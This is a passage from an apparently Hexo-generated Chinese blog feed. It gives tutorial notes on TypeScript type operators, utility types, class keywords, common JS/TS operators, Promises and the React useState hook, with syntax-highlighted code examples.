class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>();<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Hello World&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>一个函数有入参，也有出参，项目中的常规写法：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs tsx"><span class="hljs-comment">// 定义一个小姐姐</span><br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">IGirl</span> &#123;<br>  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>,<br>  <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span>,<br>  <span class="hljs-attr">skill</span>: <span class="hljs-built_in">string</span>,<br>  <span class="hljs-attr">isAnMo</span>: <span class="hljs-built_in">boolean</span>;<br>  <span class="hljs-attr">number</span>: <span class="hljs-title class_">JiShiEnum</span>;<br>&#125;;<br><span class="hljs-comment">// 定义搜索小姐姐的入参</span><br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">ISearchParams</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">IGirl</span>&#123;<br>  <span class="hljs-attr">serviceTime</span>: <span class="hljs-built_in">string</span>;<br>&#125;<br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">IGetGirls</span> &#123;<br>  <span class="hljs-attr">data</span>: <span class="hljs-title class_">IGirl</span>[];<br>&#125;<br><span class="hljs-comment">// 函数主体</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">getGirls</span>(<span class="hljs-params">data: ISearchParams</span>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">IGetGirls</span>&gt; &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-title function_">axios</span>(&#123;<br>    <span class="hljs-attr">url</span>: <span class="hljs-string">`/dabaojian/getGirls`</span>,<br>    <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;GET&#x27;</span>,<br>    data,<br>  &#125;);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="11-类型检测"><a href="#11-类型检测" class="headerlink" title="11 类型检测"></a>11 类型检测</h3><p>typeof</p><p>typeof 操作符可以用来获取一个变量或对象的类型</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs tsx"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Hero</span> &#123;<br>  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;<br>  <span class="hljs-attr">skill</span>: <span class="hljs-built_in">string</span>;<br>&#125;<br><br><span class="hljs-keyword">const</span> <span class="hljs-attr">zed</span>: <span class="hljs-title class_">Hero</span> = &#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&quot;影流之主&quot;</span>, <span class="hljs-attr">skill</span>: <span class="hljs-string">&quot;影子&quot;</span> &#125;;<br><span class="hljs-keyword">type</span> <span class="hljs-variable constant_">LOL</span> = <span class="hljs-keyword">typeof</span> zed; <span class="hljs-comment">// type LOL = Hero</span><br></code></pre></td></tr></table></figure><p>在上面代码中，我们通过 typeof 操作符获取 zed 变量的类型并赋值给 LOL 类型变量，之后我们就可以使用 LOL 类型</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tsx"><span class="hljs-keyword">const</span> <span class="hljs-attr">ahri</span>: <span class="hljs-variable constant_">LOL</span> = &#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&quot;阿狸&quot;</span>, <span class="hljs-attr">skill</span>: <span class="hljs-string">&quot;魅惑&quot;</span> &#125;;<br></code></pre></td></tr></table></figure><p>instanceof</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs tsx"><span class="hljs-keyword">class</span> <span class="hljs-title class_">NumberObj</span> &#123;<br>  <span class="hljs-attr">count</span>: <span class="hljs-built_in">number</span>;<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">addObj</span>(<span class="hljs-params">first: <span class="hljs-built_in">object</span> | NumberObj, second: <span class="hljs-built_in">object</span> | NumberObj</span>) &#123;<br>  <span class="hljs-keyword">if</span> (first <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">NumberObj</span> &amp;&amp; second <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">NumberObj</span>) &#123;<br>    <span class="hljs-keyword">return</span> first.<span class="hljs-property">count</span> + second.<span class="hljs-property">count</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>keyof</p><p>keyof 与 Object.keys 略有相似，只不过 keyof 取 interface 的键</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs tsx"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Point</span> &#123;<br>    <span class="hljs-attr">x</span>: <span class="hljs-built_in">number</span>;<br>    <span class="hljs-attr">y</span>: <span class="hljs-built_in">number</span>;<br>&#125;<br><br><span class="hljs-comment">// type keys = &quot;x&quot; | &quot;y&quot;</span><br><span class="hljs-keyword">type</span> keys = keyof <span class="hljs-title class_">Point</span>;<br></code></pre></td></tr></table></figure><p>用keyof可以更好的定义数据类型</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs tsx"><span class="hljs-keyword">function</span> get&lt;T <span class="hljs-keyword">extends</span> <span class="hljs-built_in">object</span>, K <span class="hljs-keyword">extends</span> keyof T&gt;(<span class="hljs-attr">o</span>: T, <span class="hljs-attr">name</span>: K): T[K] &#123;<br>  <span class="hljs-keyword">return</span> o[name]<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="12-ts类里的关键字"><a href="#12-ts类里的关键字" class="headerlink" title="12 ts类里的关键字"></a>12 ts类里的关键字</h3><p>public</p><p>private 类的外部不可用，继承也不行</p><p>protected 类的外部不可用，继承可以</p><p>public readOnly xxx 只读属性</p><p>static funcXXX 静态方法，不需要 new 就可以调用</p><p>abstract funcXXX 抽象类，所有子类都必须要实现 funcXXX</p><h3 id="13-Utility-Type"><a href="#13-Utility-Type" class="headerlink" title="13 Utility Type"></a>13 Utility Type</h3><p><code>Partial&lt;T&gt;</code>：将T中所有属性转换为可选属性。返回的类型可以是T的任意子集</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs tsx"><span class="hljs-keyword">export</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserModel</span> &#123;<br>  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;<br>  age?: <span class="hljs-built_in">number</span>;<br>  <span class="hljs-attr">sex</span>: <span class="hljs-built_in">number</span>;<br>&#125;<br><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">JUserModel</span> = <span class="hljs-title class_">Partial</span>&lt;<span class="hljs-title class_">UserModel</span>&gt;<br><span class="hljs-comment">// =</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">JUserModel</span> = &#123;<br>    name?: <span class="hljs-built_in">string</span> | <span class="hljs-literal">undefined</span>;<br>    age?: <span class="hljs-built_in">number</span> | <span class="hljs-literal">undefined</span>;<br>    sex?: <span class="hljs-built_in">number</span> | <span class="hljs-literal">undefined</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs tsx"><span class="hljs-comment">// 源码解析</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">Partial</span>&lt;T&gt; = &#123; [P <span class="hljs-keyword">in</span> keyof T]?: T[P]; &#125;;<br></code></pre></td></tr></table></figure><p><code>Required&lt;T&gt;</code>：通过将T的所有属性设置为必选属性来构造一个新的类型。与Partial相反</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs tsx"><span class="hljs-keyword">type</span> <span class="hljs-title class_">JUserModel2</span> = <span class="hljs-title class_">Required</span>&lt;<span class="hljs-title class_">UserModel</span>&gt;<br><span class="hljs-comment">// =</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">JUserModel2</span> = &#123;<br>    <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;<br>    <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span>;<br>    <span class="hljs-attr">sex</span>: <span class="hljs-built_in">number</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>Readonly&lt;T&gt;</code>：将T中所有属性设置为只读</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs tsx"><span class="hljs-keyword">type</span> <span class="hljs-title class_">JUserModel3</span> = <span class="hljs-title class_">Readonly</span>&lt;<span class="hljs-title class_">UserModel</span>&gt;<br><br><span class="hljs-comment">// =</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">JUserModel3</span> = &#123;<br>    <span class="hljs-keyword">readonly</span> <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;<br>    <span class="hljs-keyword">readonly</span> age?: <span class="hljs-built_in">number</span> | <span class="hljs-literal">undefined</span>;<br>    <span class="hljs-keyword">readonly</span> <span class="hljs-attr">sex</span>: <span class="hljs-built_in">number</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>Record&lt;K,T&gt;</code>：构造一个类型，该类型具有一组属性K，每个属性的类型为T。可用于将一个类型的属性映射为另一个类型。Record 后面的泛型就是对象键和值的类型。</p><p>简单理解：K对应对应的key，T对应对象的value，返回的就是一个声明好的对象</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs tsx"><span class="hljs-keyword">type</span> <span class="hljs-title class_">TodoProperty</span> = <span class="hljs-string">&#x27;title&#x27;</span> | <span class="hljs-string">&#x27;description&#x27;</span>;<br><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">Todo</span> = <span class="hljs-title class_">Record</span>&lt;<span class="hljs-title class_">TodoProperty</span>, <span class="hljs-built_in">string</span>&gt;;<br><span class="hljs-comment">// =</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">Todo</span> = &#123;<br>    <span class="hljs-attr">title</span>: <span class="hljs-built_in">string</span>;<br>    <span class="hljs-attr">description</span>: <span class="hljs-built_in">string</span>;<br>&#125;<br><br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">IGirl</span> &#123;<br>  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;<br>  <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span>;<br>&#125;<br><br><span class="hljs-keyword">type</span> allGirls = <span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-title class_">IGirl</span>&gt;<br></code></pre></td></tr></table></figure><p><code>Pick&lt;T,K&gt;</code>：在一个声明好的对象中，挑选一部分出来组成一个新的声明对象</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs tsx"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Todo</span> &#123;<br>  <span class="hljs-attr">title</span>: <span class="hljs-built_in">string</span>;<br>  <span class="hljs-attr">description</span>: <span class="hljs-built_in">string</span>;<br>  <span class="hljs-attr">done</span>: <span class="hljs-built_in">boolean</span>;<br>&#125;<br><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">TodoBase</span> = <span class="hljs-title class_">Pick</span>&lt;<span class="hljs-title class_">Todo</span>, <span class="hljs-string">&quot;title&quot;</span> | <span class="hljs-string">&quot;done&quot;</span>&gt;;<br><br><span class="hljs-comment">// =</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">TodoBase</span> = &#123;<br>    <span class="hljs-attr">title</span>: <span class="hljs-built_in">string</span>;<br>    <span class="hljs-attr">done</span>: <span class="hljs-built_in">boolean</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>Omit&lt;T,K&gt;</code>：从T中取出除去K的其他所有属性。与Pick相对。</p><p><code>Exclude&lt;T,U&gt;</code>：从T中排除可分配给U的属性，剩余的属性构成新的类型</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs tsx"><span class="hljs-keyword">type</span> <span class="hljs-variable constant_">T0</span> = <span class="hljs-title class_">Exclude</span>&lt;<span class="hljs-string">&#x27;a&#x27;</span> | <span class="hljs-string">&#x27;b&#x27;</span> | <span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>&gt;; <br><br><span class="hljs-comment">// = </span><br><br><span class="hljs-keyword">type</span> <span class="hljs-variable constant_">T0</span> = <span class="hljs-string">&quot;b&quot;</span> | <span class="hljs-string">&quot;c&quot;</span><br></code></pre></td></tr></table></figure><p><code>Extract&lt;T,U&gt;</code>：从T中抽出可分配给U的属性构成新的类型。与Exclude相反</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs tsx"><span class="hljs-keyword">type</span> <span class="hljs-variable constant_">T0</span> = <span class="hljs-title class_">Extract</span>&lt;<span class="hljs-string">&#x27;a&#x27;</span> | <span class="hljs-string">&#x27;b&#x27;</span> | <span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>&gt;; <br><br><span class="hljs-comment">// = </span><br><br><span class="hljs-keyword">type</span> <span class="hljs-variable constant_">T0</span> = <span class="hljs-string">&#x27;a&#x27;</span><br></code></pre></td></tr></table></figure><p><code>NonNullable&lt;T&gt;</code>：去除T中的 null 和 undefined 类型</p><p><code>Parameters&lt;T&gt;</code>：返回类型为T的函数的参数类型所组成的数组</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs tsx"><span class="hljs-keyword">type</span> <span class="hljs-variable constant_">T0</span> = <span class="hljs-title class_">Parameters</span>&lt;<span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">string</span>&gt;;  <span class="hljs-comment">// []</span><br><br><span class="hljs-keyword">type</span> <span class="hljs-variable constant_">T1</span> = <span class="hljs-title class_">Parameters</span>&lt;<span class="hljs-function">(<span class="hljs-params">s: <span class="hljs-built_in">string</span></span>) =&gt;</span> <span class="hljs-built_in">void</span>&gt;;  <span class="hljs-comment">// [string]</span><br></code></pre></td></tr></table></figure><p><code>ReturnType&lt;T&gt;</code></p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs tsx"><span class="hljs-keyword">type</span> <span class="hljs-variable constant_">T0</span> = <span class="hljs-title class_">ReturnType</span>&lt;<span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">string</span>&gt;;  <span class="hljs-comment">// string</span><br><br><span class="hljs-keyword">type</span> <span class="hljs-variable constant_">T1</span> = <span class="hljs-title class_">ReturnType</span>&lt;<span class="hljs-function">(<span class="hljs-params">s: <span class="hljs-built_in">string</span></span>) =&gt;</span> <span class="hljs-built_in">void</span>&gt;;  <span class="hljs-comment">// void</span><br></code></pre></td></tr></table></figure><p><code>InstanceType&lt;T&gt;</code>：返回构造函数类型T的实例类型</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs tsx"><span class="hljs-keyword">class</span> <span class="hljs-title class_">C</span> &#123;<br>  x = <span class="hljs-number">0</span>;<br>  y = <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-keyword">type</span> <span class="hljs-variable constant_">T0</span> = <span class="hljs-title class_">InstanceType</span>&lt;<span class="hljs-keyword">typeof</span> C&gt;;  <span class="hljs-comment">// C</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>前端</category>
      
    </categories>
    
    
    <tags>
      
      <tag>前端</tag>
      
      <tag>typescript</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>React + Typescript(2)</title>
    <link href="/blog/2022/11/04/react+typescript/"/>
    <url>/blog/2022/11/04/react+typescript/</url>
    
    <content type="html"><![CDATA[<h1 id="React-Typescript"><a href="#React-Typescript" class="headerlink" title="React + Typescript"></a>React + Typescript</h1><p>结合项目的一些疑惑与解答</p><h3 id="1-三点运算符与其他常见"><a href="#1-三点运算符与其他常见" class="headerlink" title="1 三点运算符与其他常见"></a>1 三点运算符与其他常见</h3><p>三点运算符：…</p><p>用来声明任意数量的方法参数，在下例中，可以传任意参数：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">func1</span>(<span class="hljs-params"> ...args </span>)&#123;<br>args.<span class="hljs-title function_">forEach</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">arg</span>) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arg)<br>    &#125;)<br>&#125;<br></code></pre></td></tr></table></figure><p>非空断言操作符：!</p><p>在上下⽂中当类型检查器⽆法断定类型时，⼀个新的后缀表达式操作符 ! 可以⽤于断⾔操作对象是⾮ <strong>null</strong> 和⾮ <strong>undefined</strong> 类型。</p><p>可选链操作符：?.</p><p>允许读取位于连接对象链深处的属性的值，而不必明确验证链中的每个引用是否有效。<code>?.</code> 操作符的功能类似于 <code>.</code> 链式操作符，不同之处在于，在引用为空(<a href="https://link.juejin.cn/?target=https://developer.mozilla.org/zh-CN/docs/Glossary/Nullish">nullish</a> ) (<a href="https://link.juejin.cn/?target=https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/null"><code>null</code></a> 或者 <a href="https://link.juejin.cn/?target=https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/undefined"><code>undefined</code></a>) 的情况下不会引起错误，该表达式短路返回值是 <code>undefined</code>。与函数调用一起使用时，如果给定的函数不存在，则返回 <code>undefined</code>。</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">const</span> baz = obj?.<span class="hljs-property">foo</span>?.<span class="hljs-property">bar</span>?.<span class="hljs-property">baz</span>; <span class="hljs-comment">// 42</span><br><span class="hljs-keyword">const</span> safe = obj?.<span class="hljs-property">qux</span>?.<span class="hljs-property">baz</span>; <span class="hljs-comment">// undefined</span><br></code></pre></td></tr></table></figure><p>空值合并运算符：??</p><p>当左侧操作数为 <strong>null</strong> 或 <strong>undefined</strong> 时，其返回右侧的操作数，否则返回左侧的操作数。</p><p>与逻辑或 || 运算符不同，逻辑或会在左操作数为 falsy 值时返回右侧操作数。也就是说，如果你使⽤|| 来为某些变量设置默认的值时，你可能会遇到意料之外的⾏为。⽐如为 falsy 值（’’、NaN 或 0）时</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">const</span> name = <span class="hljs-literal">null</span> ?? <span class="hljs-string">&#x27;nordon&#x27;</span>; <span class="hljs-comment">// 返回nodedon</span><br><span class="hljs-keyword">const</span> age = <span class="hljs-number">0</span> ?? <span class="hljs-number">18</span>; <span class="hljs-comment">// 返回 0</span><br><span class="hljs-keyword">const</span> age2 = <span class="hljs-number">0</span> || <span class="hljs-number">18</span>; <span class="hljs-comment">// 返回 18</span><br></code></pre></td></tr></table></figure><p>可选属性： ?:</p><p>在⾯向对象语⾔中，接⼝是⼀个很重要的概念，它是对⾏为的抽象，⽽具体如何⾏动需要由类去实现。<strong>TypeScript</strong> 中的接⼝是⼀个⾮常灵活的概念，除了可⽤于对类的⼀部分⾏为进⾏抽象以外，也常⽤于对「对象的形状（<strong>Shape</strong>）」进⾏描述。</p><p>在 TypeScript 中使⽤ interface 关键字就可以声明⼀个接⼝：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;<br>    age?: <span class="hljs-built_in">number</span>; <br>&#125;<br></code></pre></td></tr></table></figure><p>运算符：&amp;</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">PartialPointX</span> = &#123; <span class="hljs-attr">x</span>: <span class="hljs-built_in">number</span>; &#125;;<br><span class="hljs-keyword">type</span> <span class="hljs-title class_">Point</span> = <span class="hljs-title class_">PartialPointX</span> &amp; &#123; <span class="hljs-attr">y</span>: <span class="hljs-built_in">number</span>; &#125;;<br><span class="hljs-keyword">let</span> <span class="hljs-attr">point</span>: <span class="hljs-title class_">Point</span> = &#123;<br>  <span class="hljs-attr">x</span>: <span class="hljs-number">1</span>, <br>  <span class="hljs-attr">y</span>: <span class="hljs-number">1</span> <br>&#125;<br></code></pre></td></tr></table></figure><p>运算符：|</p><p>在 TypeScript 中联合类型（Union Types）表示取值可以为多种类型中的⼀种，联合类型使⽤ | 分隔每个类型。联合类型通常与 null 或 undefined ⼀起使⽤</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">const</span> <span class="hljs-title function_">fn</span> = (<span class="hljs-params">info: strong | <span class="hljs-literal">null</span> | <span class="hljs-literal">undefined</span></span>) =&gt; &#123;&#125;<br></code></pre></td></tr></table></figure><p>数字分割符：_</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">const</span> num1 = <span class="hljs-number">1_234_567</span>;<br><span class="hljs-comment">// 等价</span><br><span class="hljs-keyword">const</span> num1 = <span class="hljs-number">1234567</span>;<br></code></pre></td></tr></table></figure><h3 id="2-Promise"><a href="#2-Promise" class="headerlink" title="2 Promise"></a>2 Promise</h3><p>Promise 表示一个异步操作的最终结果，与之进行交互的方式主要是 then 方法，该方法注册了两个回调函数，用于接收 promise 的终值或本 promise 不能执行的原因。</p><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/1551668316202_.pic-20221113%2020:35:29.jpg" alt="1551668316202_.pic"></p><p>特性：链式调用、内部三种状态（Pending（进行中），Resolved(完成)，Rejected (失败)。Promise从Pending状态开始，如果成功就转到成功态，并执行resolve回调函数；如果失败就转到失败状态并执行reject回调函数。 Promise一旦状态改变，就不会再变，任何时候都可以得到这个结果。）</p><p>例如一个<code>createAudioFileAsync</code>方法：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-title function_">createAudioFileAsync</span>(audioSettings).<span class="hljs-title function_">then</span>(successCallback, failureCallback);<br></code></pre></td></tr></table></figure><p>出现的背景：解决ajax回调地狱（当嵌套层数很多时，会变得难以维护）</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-title function_">doSomething</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">result</span>) &#123;<br>  <span class="hljs-title function_">doSomethingElse</span>(result, <span class="hljs-keyword">function</span>(<span class="hljs-params">newResult</span>) &#123;<br>    <span class="hljs-title function_">doThirdThing</span>(newResult, <span class="hljs-keyword">function</span>(<span class="hljs-params">finalResult</span>) &#123;<br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Got the final result: &#x27;</span> + finalResult);<br>    &#125;, failureCallback);<br>  &#125;, failureCallback);<br>&#125;, failureCallback);<br></code></pre></td></tr></table></figure><p>连续执行两个或者多个异步操作是一个常见的需求，在上一个操作执行成功之后，开始下一个的操作，并带着上一步操作所返回的结果。我们可以通过创造一个 <strong>Promise 链</strong>来实现这种需求：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-title function_">doSomething</span>().<span class="hljs-title function_">then</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">result</span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-title function_">doSomethingElse</span>(result);<br>&#125;)<br>.<span class="hljs-title function_">then</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">newResult</span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-title function_">doThirdThing</span>(newResult);<br>&#125;)<br>.<span class="hljs-title function_">then</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">finalResult</span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Got the final result: &#x27;</span> + finalResult);<br>&#125;)<br>.<span class="hljs-title function_">catch</span>(failureCallback);<br></code></pre></td></tr></table></figure><h3 id="3-React-hook"><a href="#3-React-hook" class="headerlink" title="3 React hook"></a>3 React hook</h3><h5 id="1-useState"><a href="#1-useState" class="headerlink" title="1 useState"></a>1 useState</h5><blockquote><p>用来更新值以及重新渲染</p></blockquote><p>使用方法：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">const</span> [state, setState] = <span class="hljs-title function_">useState</span>(initialState)<br></code></pre></td></tr></table></figure><p>这行代码返回一个 state，以及更新 state 的函数。</p><p>setState 函数用于更新 state。它接收一个新的 state 值并将组件的一次重新渲染加入队列。</p><p>在初始渲染期间，返回的状态 (state) 与传入的第一个参数 (initialState) 值相同。</p><p>调用：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span>, &#123; useState &#125; <span class="hljs-keyword">from</span> <span 